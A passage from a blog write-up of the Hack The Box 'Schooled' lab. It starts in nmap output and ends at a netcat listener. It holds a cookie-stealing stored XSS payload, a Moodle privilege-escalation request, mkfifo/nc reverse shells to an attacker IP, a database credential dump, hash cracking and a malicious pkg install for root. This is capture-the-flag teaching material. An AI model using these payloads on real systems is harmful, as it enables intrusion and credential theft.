SF:LL,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(GenericLines,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>
SF:08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(GetRequest,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(HTTPOpt
SF:ions,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(RTSPRequest,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\</span>
SF:x08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(RPCCheck,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(DNSVersi
SF:onBindReqTCP,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(DNSStatusRequestTCP,2B
SF:,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0\x</span>1e<span class="se">\0\0\0\x</span>01<span class="se">\x</span>08<span class="se">\x</span>01<span class="se">\x</span>10<span class="se">\x</span>88<span class="s1">'\x1a\x0fIn
SF:valid\x20message\"\x05HY000")%r(Help,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%
SF:r(SSLSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\
SF:x10\x88'</span><span class="se">\x</span>1a<span class="se">\x</span>0fInvalid<span class="se">\x</span>20message<span class="se">\"\x</span>05HY000<span class="s2">")%r(TerminalServerCookie,
SF:9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(TLSSessionReq,2B,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>0
SF:8<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0\x</span>1e<span class="se">\0\0\0\x</span>01<span class="se">\x</span>08<span class="se">\x</span>01<span class="se">\x</span>10<span class="se">\x</span>88<span class="s1">'\x1a\x0fInvalid\x20message\"\
SF:x05HY000")%r(Kerberos,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SMBProgNeg,9,
SF:"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(X11Probe,2B,"\x05\0\0\0\x0b\x08\x05\x
SF:1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'</span><span class="se">\x</span>1a<span class="se">\x</span>0fInvalid<span class="se">\x</span>20message<span class="se">\"\x</span>05HY00
SF:0<span class="s2">")%r(FourOhFourRequest,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(LPDString,9
SF:,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(LDAPSearchReq,2B,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08
SF:<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0\x</span>1e<span class="se">\0\0\0\x</span>01<span class="se">\x</span>08<span class="se">\x</span>01<span class="se">\x</span>10<span class="se">\x</span>88<span class="s1">'\x1a\x0fInvalid\x20message\"\x
SF:05HY000")%r(LDAPBindReq,46,"\x05\0\0\0\x0b\x08\x05\x1a\x009\0\0\0\x01\x
SF:08\x01\x10\x88'</span><span class="se">\x</span>1a<span class="se">\*</span>Parse<span class="se">\x</span>20error<span class="se">\x</span>20unserializing<span class="se">\x</span>20protobuf<span class="se">\x</span>20mes
SF:sage<span class="se">\"\x</span>05HY000<span class="s2">")%r(SIPOptions,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(LAND
SF:esk-RC,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(TerminalServer,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0</span>
SF:<span class="se">\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(NCP,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(NotesRPC
SF:,2B,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0\x</span>1e<span class="se">\0\0\0\x</span>01<span class="se">\x</span>08<span class="se">\x</span>01<span class="se">\x</span>10<span class="se">\x</span>88<span class="s1">'\x1a\x0
SF:fInvalid\x20message\"\x05HY000")%r(JavaRMI,9,"\x05\0\0\0\x0b\x08\x05\x1
SF:a\0")%r(WMSRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(oracle-tns,32,"\
SF:x05\0\0\0\x0b\x08\x05\x1a\0%\0\0\0\x01\x08\x01\x10\x88'</span><span class="se">\x</span>1a<span class="se">\x</span>16Invalid<span class="se">\</span>
SF:x20message-frame<span class="se">\.\"\x</span>05HY000<span class="s2">")%r(ms-sql-s,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1
SF:a<span class="se">\0</span><span class="s2">")%r(afp,2B,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0\x</span>1e<span class="se">\0\0\0\x</span>01<span class="se">\x</span>08<span class="se">\x</span>01<span class="se">\x</span>10<span class="se">\</span>
SF:x88<span class="s1">'\x1a\x0fInvalid\x20message\"\x05HY000");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.96 seconds
</span></code></pre></div></div>

<h3 id="80tcp---http-service">80/TCP - HTTP Service</h3>

<p>Accessing this initial page, we can see an institutional page of a School, which also mentions that all content is delivered using <strong>Moodle</strong>, that we might need to find it to dig a little further on it.</p>

<p><img src="https://i.imgur.com/hy0QFcA.png" alt="HTB Schooled - Institutional Page" class="align-center" /></p>

<p>Also, by running <code class="language-plaintext highlighter-rouge">whatweb</code> I have found an e-mail address <strong>admissions@schooled.htb</strong> where <code class="language-plaintext highlighter-rouge">schooled.htb</code> might be the domain name for this machine, which was later added to the hosts file.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>whatweb <span class="nt">--color</span><span class="o">=</span>never <span class="nt">-a</span> 3 10.10.10.234
http://10.10.10.234 <span class="o">[</span>200 OK] Apache[2.4.46], Bootstrap[4.1.0], Country[RESERVED][ZZ], Email[#,admissions@schooled.htb], HTML5, HTTPServer[FreeBSD][Apache/2.4.46 <span class="o">(</span>FreeBSD<span class="o">)</span> PHP/7.4.15], IP[10.10.10.234], PHP[7.4.15], Script, Title[Schooled - A new kind of educational institute], X-UA-Compatible[IE<span class="o">=</span>edge]
</code></pre></div></div>

<p>While left <code class="language-plaintext highlighter-rouge">gobuster</code> running in the background to check other pages in the site, started another instance <strong>enumerating subdomains</strong> and have found both <strong>moodle</strong> and <strong>student</strong>, also later added to the local hosts file.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>gobuster dns <span class="nt">-d</span> schooled.htb <span class="nt">-w</span> /usr/share/dnsrecon/subdomains-top1mil-5000.txt
<span class="o">===============================================================</span>
Gobuster v3.1.0
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+] Domain:     schooled.htb
<span class="o">[</span>+] Threads:    10
<span class="o">[</span>+] Timeout:    1s
<span class="o">[</span>+] Wordlist:   /usr/share/dnsrecon/subdomains-top1mil-5000.txt
<span class="o">===============================================================</span>
2021/08/01 17:24:31 Starting gobuster <span class="k">in </span>DNS enumeration mode
<span class="o">===============================================================</span>
Found: moodle.schooled.htb
Found: student.schooled.htb

<span class="o">===============================================================</span>
2021/08/01 17:25:04 Finished
<span class="o">===============================================================</span>
</code></pre></div></div>

<p>The subdomain <code class="language-plaintext highlighter-rouge">student.schooled.htb</code> was redirecting to the main page while <code class="language-plaintext highlighter-rouge">moodle.schooled.htb</code> was redirecting to the page below, a Moodle site that could allow us to gather some additional information, allowing us to have an initial foothold or even an RCE based on existing vulnerabilities.</p>

<p><img src="https://i.imgur.com/Sx32BwP.png" alt="HTB Schooled - Moodle" class="align-center" /></p>

<p>Starting with Moodle site enumeration, ran <a href="https://github.com/inc0d3/moodlescan">moodlescan</a>, a script that helps us to enumerate Moodle version, which returned <strong>3.9.0-beta</strong> as output below.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python3 moodlescan.py <span class="nt">-u</span> http://moodle.schooled.htb/moodle

Version 0.8 - May/2021
.............................................................................................................

By Victor Herrera - supported by www.incode.cl

.............................................................................................................

Getting server information http://moodle.schooled.htb/moodle ...

server          : Apache/2.4.46 <span class="o">(</span>FreeBSD<span class="o">)</span> PHP/7.4.15
x-powered-by    : PHP/7.4.15
x-frame-options : sameorigin
last-modified   : Mon, 02 Aug 2021 11:54:53 GMT

Getting moodle version...

Version found via /admin/tool/lp/tests/behat/course_competencies.feature : Moodle v3.9.0-beta

Searching vulnerabilities...


Vulnerabilities found: 0

Scan completed.
</code></pre></div></div>

<p>Considering this version, did a quick search on the version. Found out that several vulnerabilities were present but would require some permissions that I still don’t have. So decided to proceed on creating an account to poke a little inside the platform, considering that nothing was available for guests.</p>

<p>While creating the account, noticed a requirement for an e-mail account from <strong>student.schooled.htb</strong> subdomain, previously enumerated using <code class="language-plaintext highlighter-rouge">gobuster dns</code>.</p>

<p>Besides the e-mail domain requirement, e-mail validation wasn’t required and with access to the platform started to browse the contents, to which I was only able to self-enroll to Mathematics class, where was found the following announcement:</p>

<blockquote>
  <p>Reminder for joining students
by Manuel Phillips - Wednesday, 23 December 2020, 12:01 AM
Number of replies: 0
This is a self enrollment course. For students who wish to attend my lectures be sure that you have your MoodleNet profile set.</p>

  <p>Students who do not set their MoodleNet profiles will be removed from the course before the course is due to start and I will be checking all students who are enrolled on this course.</p>

  <p>Look forward to seeing you all soon.</p>

  <p>Manuel Phillips</p>
</blockquote>

<p>This means that teacher Manuel Philips will check all MoodleNet profiles for all enrolled students and, in case we can store an XSS on it, we might be able to steal the teacher’s session and enumerate further the platform while searching for an RCE opportunity.</p>

<h2 id="initial-access">Initial access</h2>

<p>Searching for <strong>MoodleNet XSS</strong>, I came across a <a href="https://moodle.org/mod/forum/discuss.php?d=410839">Security Announcement</a> from Moodle mentioning the <strong>CVE-2020-25627</strong>, which was fixed in version 3.9.2 and affected versions 3.9 and 3.9.1, that matches our scenario.</p>

<p>Searching for a PoC for the related CVE, found the repo <a href="https://github.com/HoangKien1020/CVE-2020-25627">HoangKien1020/CVE-2020-25627: Stored XSS via moodlenetprofile parameter in user profile (github.com)</a> containing the instructions to exploit it, which was implemented and permitted us to obtain teacher’s session cookie as evidence below:</p>

<ul>
  <li>Logged as the recently created user and modified the MoodleNet profile with the following content</li>
</ul>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span><span class="kd">var</span> <span class="nx">i</span><span class="o">=</span><span class="k">new</span> <span class="nx">Image</span><span class="p">;</span><span class="nx">i</span><span class="p">.</span><span class="nx">src</span><span class="o">=</span><span class="dl">"</span><span class="s2">http://10.10.10.10/xss.php?</span><span class="dl">"</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">;</span><span class="nt">&lt;/script&gt;</span>
</code></pre></div></div>

<ul>
  <li>Hosted the <code class="language-plaintext highlighter-rouge">xss.php</code> in a folder and started a local PHP webserver, which 2 minutes later displayed us the teacher’s cookie on the page</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>php <span class="nt">-S</span> 0.0.0.0:80 <span class="nt">-t</span> <span class="nb">.</span>
<span class="o">[</span>Mon Aug  9 14:44:05 2021] PHP 7.4.21 Development Server <span class="o">(</span>http://0.0.0.0:80<span class="o">)</span> started
<span class="o">[</span>Mon Aug  9 14:45:28 2021] 10.10.10.234:55102 Accepted
<span class="o">[</span>Mon Aug  9 14:45:28 2021] PHP Notice:  Undefined index: METHOD <span class="k">in</span> /opt/dcruz/htb/schooled-10.10.10.234/exploit/www/xss.php on line 28
<span class="o">[</span>Mon Aug  9 14:45:28 2021] PHP Notice:  Undefined index: REMOTE_HOST <span class="k">in</span> /opt/dcruz/htb/schooled-10.10.10.234/exploit/www/xss.php on line 29
<span class="o">[</span>Mon Aug  9 14:45:28 2021] 10.10.10.234:55102 <span class="o">[</span>200]: GET /xss.php?MoodleSession<span class="o">=</span>d8so1t4rs4vmg8btrgfr2ps6fr
<span class="o">[</span>Mon Aug  9 14:45:28 2021] 10.10.10.234:55102 Closing

</code></pre></div></div>

<p>Now aware of this Session parameter, changed it in browser and we can now see in the upper right corner that I’m connected as Manuel Philips</p>

<p><img src="https://i.imgur.com/n3plh19.png" alt="HTB Schooled - Moodle as Manuel Philips" class="align-center" /></p>

<p>Now that I have a more privileged access as a teacher, we need to check if current permissions (Teacher) are enough to get an RCE.</p>

<p>Searching about Moodle Exploitation on <a href="https://book.hacktricks.xyz/pentesting/pentesting-web/moodle#rce">Moodle - HackTricks</a> page, found out that I need to be a manager to upload a plugin, which can host malicious code to our purpose. Besides not having the appropriate permission noticed that version <strong>is also vulnerable to a</strong> <a href="https://moodle.org/mod/forum/discuss.php?d=407393"><strong>Privilege Escalation Vulnerability</strong></a>, which could allow me to get manager permission in the course abusing the enrollment process and, if a student is the Site Manager, I could impersonate him and upload the malicious plugin, obtaining RCE. The same author of the other CVE has also <a href="https://github.com/HoangKien1020/CVE-2020-14321">a repository in Github</a> containing a PoC that could help us to escalate those privileges and get RCE.</p>

<p>Besides not working well in our scenario, understanding the steps required used in the exploit, the following steps were executed to be able to get RCE:</p>

<ul>
  <li>The first thing would identify who in the platform could have manager permissions. Based on the institutional page, <strong>Lianne Carter</strong> is the school’s manager and possibly has the rights we need.</li>
  <li>Also took note of <strong>Manuel Philips</strong>’ Profile id, which was obtained from his profile page at <code class="language-plaintext highlighter-rouge">http://moodle.schooled.htb/moodle/user/profile.php?id=24</code>.</li>
  <li>Things started by enrolling the school’s manager in the class and, intercepting the request and sending a copy of it to Burp’s Repeater, also crafted a request granting us Manager Administration in the course, by assigning us the <code class="language-plaintext highlighter-rouge">roleid=1</code> in the request, as well as changing the assignee id to Manuel Philips, the same way as seen in the PoC video.</li>
</ul>

<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/moodle/enrol/manual/ajax.php?mform_showmore_main=0&amp;id=5&amp;action=enrol&amp;enrolid=10&amp;sesskey=KbJYqTapFc&amp;_qf__enrol_manual_enrol_users_form=1&amp;mform_showmore_id_main=0&amp;userlist%5B%5D=24&amp;roletoassign=1&amp;startdate=4&amp;duration=</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">moodle.schooled.htb</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">*/*</span>
<span class="na">X-Requested-With</span><span class="p">:</span> <span class="s">XMLHttpRequest</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/json</span>
<span class="na">Referer</span><span class="p">:</span> <span class="s">http://moodle.schooled.htb/moodle/user/index.php?id=5</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.9</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">MoodleSession=jil2s8i0vj0gq3vojfki6e7rtq</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
</code></pre></div></div>

<ul>
  <li>
    <p>Now as a course administrator, accessing a user’s profile, we can see the “Log in as” link, which permitted us to impersonate Lianne Carter.</p>

    <p><img src="https://i.imgur.com/zRjimbq.png" alt="HTB Schooled - Impersonating Manager in Moodle" class="align-center" /></p>
  </li>
  <li>
    <p>Now as Lianne, we were supposed to be able to upload the plugin directly but, as this option isn’t enabled in their tenant, we needed to first edit the Role permissions to allow this. Navigated to Site Administration pane &gt; Users and then, under Permissions, selected Define roles.</p>

    <p><img src="https://i.imgur.com/6XmydvH.png" alt="HTB Schooled - Adjusting Role Definitions" /></p>
  </li>
  <li>
    <p>Selected the <strong>Manager</strong> role and, after clicking in the “Edit” Button, intercepted the request, and appended the payload for full permissions, as shared also in the previously used script repo.</p>

    <p><img src="https://i.imgur.com/lm0NOX7.png" alt="HTB Schooled - Modifying Manager role" class="align-center" /></p>

    <p><img src="https://i.imgur.com/5L28UqN.png" alt="HTB Schooled - Appending payload to Edit Request" class="align-center" /></p>
  </li>
  <li>
    <p>Now, navigating to Site Administration &gt; Plugins we can see the Install Plugins option, where the rce.zip also available in the portal was available, which was uploaded with success, and allowed us to obtain RCE by calling the URL below, later changed to get a reverse shell</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="nt">-X</span> GET <span class="nt">-G</span> <span class="s1">'http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php'</span> <span class="nt">--data-urlencode</span> <span class="s1">'cmd=id'</span>
<span class="nv">uid</span><span class="o">=</span>80<span class="o">(</span>www<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>80<span class="o">(</span>www<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>80<span class="o">(</span>www<span class="o">)</span>

<span class="nv">$ </span>curl <span class="nt">-X</span> GET <span class="nt">-G</span> <span class="s1">'http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php'</span> <span class="nt">--data-urlencode</span> <span class="s1">'cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.10 4443 &gt;/tmp/f'</span>
</code></pre></div></div>

<h2 id="user-flag">User Flag</h2>

<p>Now with <code class="language-plaintext highlighter-rouge">www-data</code> account, started enumerating box. As usual decided to automate the task using <code class="language-plaintext highlighter-rouge">linpeas.sh</code> but found out that <code class="language-plaintext highlighter-rouge">wget</code> and <code class="language-plaintext highlighter-rouge">curl</code> were not available, so I wrote a simple <code class="language-plaintext highlighter-rouge">php</code> script that downloads a file from a webserver and then ran the script</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"&lt;?php"</span> <span class="o">&gt;</span> wget.php
<span class="nb">echo</span> <span class="s2">"</span><span class="se">\$</span><span class="s2">url = 'http://10.10.10.10/linpeas.sh';"</span> <span class="o">&gt;&gt;</span> wget.php
<span class="nb">echo</span> <span class="s2">"</span><span class="se">\$</span><span class="s2">file = '/tmp/linpeas.sh';"</span> <span class="o">&gt;&gt;</span> wget.php
<span class="nb">echo</span> <span class="s2">"</span><span class="se">\$</span><span class="s2">current = file_get_contents(</span><span class="se">\$</span><span class="s2">url);"</span> <span class="o">&gt;&gt;</span> wget.php
<span class="nb">echo</span> <span class="s2">"file_put_contents(</span><span class="se">\$</span><span class="s2">file, </span><span class="se">\$</span><span class="s2">current);"</span> <span class="o">&gt;&gt;</span> wget.php
<span class="nb">echo</span> <span class="s2">"?&gt;"</span> <span class="o">&gt;&gt;</span> wget.php

/usr/local/bin/php wget.php
</code></pre></div></div>

<p>From the execution, the following information was obtained:</p>

<ul>
  <li>Users with console and their permissions:</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jamie:*:1001:1001:Jamie:/home/jamie:/bin/sh
root:*:0:0:Charlie &amp;:/root:/bin/csh
steve:*:1002:1002:User &amp;:/home/steve:/bin/csh
</code></pre></div></div>

<ul>
  <li>Moodle Database password in file `/usr/local/www/apache24/data/moodle/config.php` :</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$CFG-&gt;dbtype    = 'mysqli';
$CFG-&gt;dbhost    = 'localhost';
$CFG-&gt;dbuser    = 'moodle';
$CFG-&gt;dbpass    = 'PlaybookMaster2020';
'dbport' =&gt; 3306,
</code></pre></div></div>

<p>Later I have found that we were only missing some paths in PATH finding <code class="language-plaintext highlighter-rouge">curl</code> installed. This was also needed to find <code class="language-plaintext highlighter-rouge">mysql</code> binary to dump the database credentials, as command line below, which was required once I wasn’t in an interactive tty</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>find / <span class="nt">-type</span> f 2&gt;/dev/null | <span class="nb">grep</span> <span class="nt">-e</span> <span class="s2">"wget$"</span> <span class="nt">-e</span> <span class="s2">"curl$"</span> <span class="nt">-e</span> <span class="s2">"mysql$"</span>
/usr/local/bin/curl
/usr/local/bin/mysql
/usr/local/share/bash-completion/completions/wget
/usr/local/share/bash-completion/completions/curl
/usr/local/share/bash-completion/completions/mysql
/usr/local/share/zsh/site-functions/_curl
/var/mail/mysql
</code></pre></div></div>

<p>Dumping the creds was possible with the command below:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>/usr/local/bin/mysql <span class="nt">-u</span> moodle <span class="nt">--password</span><span class="o">=</span>PlaybookMaster2020 <span class="nt">-e</span> <span class="s2">"use moodle; select email,username,password from mdl_user; exit"</span> | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s1">'student.'</span>
mysql: <span class="o">[</span>Warning] Using a password on the <span class="nb">command </span>line interface can be insecure.
ERROR 1064 <span class="o">(</span>42000<span class="o">)</span> at line 1: You have an error <span class="k">in </span>your SQL syntax<span class="p">;</span> check the manual that corresponds to your MySQL server version <span class="k">for </span>the right syntax to use near <span class="s1">'exit'</span> at line 1
email   username        password
root@localhost  guest   <span class="nv">$2y$10$u8DkSWjhZnQhBk1a0g1ug</span>.x79uhkx/sa7euU8TI4FX4TCaXK6uQk2
jamie@staff.schooled.htb        admin   <span class="nv">$2y$10$3D</span>/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW
higgins_jane@staff.schooled.htb higgins_jane    <span class="nv">$2y$10$n9SrsMwmiU</span>.egHN60RleAOauTK2XShvjsCS0tAR6m54hR1Bba6ni2
phillips_manuel@staff.schooled.htb      phillips_manuel <span class="nv">$2y$10$ZwxEs65Q0gO8rN8zpVGU2eYDvAoVmWYYEhHBPovIHr8HZGBvEYEYG</span>
carter_lianne@staff.schooled.htb        carter_lianne   <span class="nv">$2y$10$jw</span>.KgN/SIpG2MAKvW8qdiub67JD7STqIER1VeRvAH4fs/DPF57JZe
</code></pre></div></div>

<p>Based on the hashes, created a file in the format username:hash and then ran <code class="language-plaintext highlighter-rouge">john</code>, where was obtained the password for account <code class="language-plaintext highlighter-rouge">jamie</code> as below</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>john <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt accounts.txt                                                                 Using default input encoding: UTF-8
Loaded 5 password hashes with 5 different salts <span class="o">(</span>bcrypt <span class="o">[</span>Blowfish 32/64 X3]<span class="o">)</span>
Cost 1 <span class="o">(</span>iteration count<span class="o">)</span> is 1024 <span class="k">for </span>all loaded hashes
Will run 2 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
<span class="o">!</span>QAZ2wsx         <span class="o">(</span>jamie<span class="o">)</span>
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session aborted
</code></pre></div></div>

<p>With these creds, connected through SSH and obtained the <code class="language-plaintext highlighter-rouge">user.txt</code> flag :smile:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jamie@Schooled:~ <span class="nv">$ </span><span class="nb">id</span> <span class="o">&amp;&amp;</span> <span class="nb">hostname</span> <span class="o">&amp;&amp;</span> <span class="nb">cat </span>user.txt
<span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>jamie<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>jamie<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>jamie<span class="o">)</span>,0<span class="o">(</span>wheel<span class="o">)</span>
Schooled
&lt;redacted&gt;
</code></pre></div></div>

<h2 id="root-flag">Root Flag</h2>

<p>Starting the enumeration for the root flag, the first command executed was <code class="language-plaintext highlighter-rouge">sudo -l</code> as usual, which displayed the commands below</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jamie@Schooled:~ <span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
User jamie may run the following commands on Schooled:
    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/sbin/pkg update
    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/sbin/pkg <span class="nb">install</span> <span class="k">*</span>
</code></pre></div></div>

<p>Checking the <a href="https://gtfobins.github.io/gtfobins/pkg/">GTFOBins page</a> for <code class="language-plaintext highlighter-rouge">pkg</code> found that we might be able to install a crafted package to run a command. The below steps were used to obtain a reverse shell as root</p>

<ul>
  <li>Installed <code class="language-plaintext highlighter-rouge">fpm</code>, also available from this <a href="https://github.com/jordansissel/fpm">Github Repository</a></li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>apt-get <span class="nb">install </span>ruby ruby-dev rubygems build-essential
<span class="nb">sudo </span>gem <span class="nb">install</span> <span class="nt">--no-document</span> fpm
</code></pre></div></div>

<ul>
  <li>Created a package containing the malicious payload from the attacker machine</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">TF</span><span class="o">=</span><span class="si">$(</span><span class="nb">mktemp</span> <span class="nt">-d</span><span class="si">)</span>
<span class="nb">echo</span> <span class="s1">'export file="/tmp/zurc"'</span> <span class="o">&gt;</span> <span class="nv">$TF</span>/x.sh
<span class="nb">echo</span> <span class="s1">'rm $file;mkfifo $file;cat $file|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.10 4443 &gt;$file'</span> <span class="o">&gt;&gt;</span> <span class="nv">$TF</span>/x.sh
fpm <span class="nt">-n</span> x <span class="nt">-s</span> <span class="nb">dir</span> <span class="nt">-t</span> freebsd <span class="nt">-a</span> all <span class="nt">--before-install</span> <span class="nv">$TF</span>/x.sh <span class="nv">$TF</span>
</code></pre></div></div>

<ul>
  <li>Download package and install using <code class="language-plaintext highlighter-rouge">sudo</code> based on <code class="language-plaintext highlighter-rouge">jamie</code>’s permissions</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jamie@Schooled:/tmp <span class="nv">$ </span>/usr/local/bin/curl http://10.10.10.10/x-1.0.txz <span class="nt">-o</span> x-1.0.txz
1.0.txz  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
100   572  100   572    0     0   4144      0 <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:--  4144
jamie@Schooled:/tmp <span class="nv">$ </span><span class="nb">sudo </span>pkg <span class="nb">install</span> <span class="nt">-y</span> <span class="nt">--no-repo-update</span> ./x-1.0.txz
pkg: Repository FreeBSD has a wrong packagesite, need to re-create database
pkg: Repository FreeBSD cannot be opened. <span class="s1">'pkg update'</span> required
Checking integrity... <span class="k">done</span> <span class="o">(</span>0 conflicting<span class="o">)</span>
The following 1 package<span class="o">(</span>s<span class="o">)</span> will be affected <span class="o">(</span>of 0 checked<span class="o">)</span>:

New packages to be INSTALLED:
        x: 1.0

Number of packages to be installed: 1
<span class="o">[</span>1/1] Installing x-1.0...
<span class="nb">rm</span>: /tmp/zurc: No such file or directory
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-lnvp</span> 4443
listening on <span class="o">[</span>any] 4443 ...
